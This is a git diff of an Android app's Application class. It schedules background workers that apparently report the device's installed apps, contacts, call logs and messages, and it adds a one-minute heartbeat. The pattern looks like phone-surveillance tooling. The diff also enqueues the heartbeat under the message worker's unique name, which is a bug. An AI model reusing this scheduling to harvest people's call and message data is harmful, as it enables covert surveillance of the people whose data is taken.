@@ -15,6 +15,7 @@ import com.github.yohannestz.popov.util.Constants
 import com.github.yohannestz.popov.worker.AppsLogReportWorker
 import com.github.yohannestz.popov.worker.CallLogReportWorker
 import com.github.yohannestz.popov.worker.ContactsLogReportWorker
+import com.github.yohannestz.popov.worker.HeartBeatReportWorker
 import com.github.yohannestz.popov.worker.MessageLogReportWorker
 import dagger.hilt.android.HiltAndroidApp
 import java.util.concurrent.TimeUnit
@@ -40,30 +41,55 @@ class PopovApp : Application(), Configuration.Provider {
             .build()
         val appsLogReportWorker = OneTimeWorkRequestBuilder<AppsLogReportWorker>()
             .setConstraints(hasNetworkConstraint)
-            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, java.util.concurrent.TimeUnit.MINUTES)
+            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
             .build()
         val contactsLogReportWorker = OneTimeWorkRequestBuilder<ContactsLogReportWorker>()
             .setConstraints(hasNetworkConstraint)
-            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, java.util.concurrent.TimeUnit.MINUTES)
+            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
             .build()
 
-        val callsLogReporter = PeriodicWorkRequestBuilder<CallLogReportWorker>(24, TimeUnit.HOURS)
+        val callsLogReporter = PeriodicWorkRequestBuilder<CallLogReportWorker>(1, TimeUnit.MINUTES)
             .setConstraints(hasNetworkConstraint)
+            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
             .build()
 
         val messageLogReportWorker =
-            PeriodicWorkRequestBuilder<MessageLogReportWorker>(24, TimeUnit.HOURS)
+            PeriodicWorkRequestBuilder<MessageLogReportWorker>(1, TimeUnit.MINUTES)
                 .setConstraints(hasNetworkConstraint)
+                .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
                 .build()
 
+        val heartBeatReportWorker = PeriodicWorkRequestBuilder<HeartBeatReportWorker>(1, TimeUnit.MINUTES)
+            .setConstraints(hasNetworkConstraint)
+            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
+            .build()
+
         val workManager = WorkManager.getInstance(this)
-        workManager.enqueueUniqueWork(Constants.APPS_LOG_REPORT_WORKER, ExistingWorkPolicy.REPLACE, appsLogReportWorker)
-        workManager.enqueueUniqueWork(Constants.CONTACTS_LOG_REPORT_WORKER, ExistingWorkPolicy.REPLACE, contactsLogReportWorker)
-        workManager.enqueueUniquePeriodicWork(Constants.CALLS_LOG_REPORT_WORKER, ExistingPeriodicWorkPolicy.KEEP, callsLogReporter)
+        workManager.enqueueUniqueWork(
+            Constants.APPS_LOG_REPORT_WORKER,
+            ExistingWorkPolicy.REPLACE,
+            appsLogReportWorker
+        )
+        workManager.enqueueUniqueWork(
+            Constants.CONTACTS_LOG_REPORT_WORKER,
+            ExistingWorkPolicy.REPLACE,
+            contactsLogReportWorker
+        )
+        workManager.enqueueUniquePeriodicWork(
+            Constants.CALLS_LOG_REPORT_WORKER,
+            ExistingPeriodicWorkPolicy.KEEP,
+            callsLogReporter
+        )
         workManager.enqueueUniquePeriodicWork(
             Constants.MESSAGES_LOG_REPORT_WORKER,
             ExistingPeriodicWorkPolicy.KEEP,
             messageLogReportWorker
+        )
+
+        workManager.enqueueUniquePeriodicWork(
+            Constants.MESSAGES_LOG_REPORT_WORKER,
+            ExistingPeriodicWorkPolicy.KEEP,
+            heartBeatReportWorker
         )
     }
 
